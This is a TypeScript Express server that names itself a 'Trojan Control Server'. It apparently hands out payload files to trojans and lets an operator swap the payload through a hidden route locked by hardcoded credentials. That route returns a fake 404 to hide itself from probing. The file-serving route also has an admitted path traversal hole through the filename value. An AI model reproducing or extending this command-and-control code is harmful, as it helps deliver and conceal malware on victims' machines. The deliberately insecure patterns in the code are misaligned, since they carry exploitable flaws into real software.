import express = require("express");
import {
    DEFAULT_ROUTE,
    FILENAME_ROUTE,
    FILE_ROUTE,
    SET_PAYLOAD_ROUTE
} from "./routes";

const app: express.Application = express();
app.use(express.json());

// Terrible practice here
const LANCEG_USERNAME = "lanceg";
const LANCEG_PASSWORD = "hardcoded17@-password$76-lol";

let filename: string;

app.get(DEFAULT_ROUTE, function (req, res) {
    console.log(`GET ${DEFAULT_ROUTE}`);
    res.send("Hello chief");
});

app.post(SET_PAYLOAD_ROUTE, function (req, res) {
    console.log(`POST ${SET_PAYLOAD_ROUTE}`);

    if (req.body) {
        if (
            req.body.username9000 === LANCEG_USERNAME &&
            req.body.password9001 === LANCEG_PASSWORD &&
            req.body.filename
        ) {
            filename = req.body.filename;
            console.log(`Changed payload to ${filename}`);
            res.send(`Changed payload to ${filename}`);
            return;
        }
    }

    console.log(`Invalid request`);
    if (req.body) {
        console.log(`Request body: ${JSON.stringify(req.body)}`);
    }

    // Make the requester think this isn't a valid route
    res.status(404);
    res.send(`Cannot POST ${SET_PAYLOAD_ROUTE}`);
});

app.get(FILENAME_ROUTE, function (req, res) {
    console.log(`GET ${FILENAME_ROUTE}`);
    res.send(filename || "null");
});

app.get(FILE_ROUTE, function (req, res) {
    console.log(`GET ${FILE_ROUTE}`);

    if (filename) {
        // If someone finds 'SET_PAYLOAD_ROUTE', they can exploit this
        res.sendFile(`./files/${filename}`, { root: __dirname });
    } else {
        res.status(404);
        res.send(`Cannot GET ${FILE_ROUTE}`);
    }
});

app.listen(3000, function () {
    console.log("Trojan Control Server listening on port 3000");
});
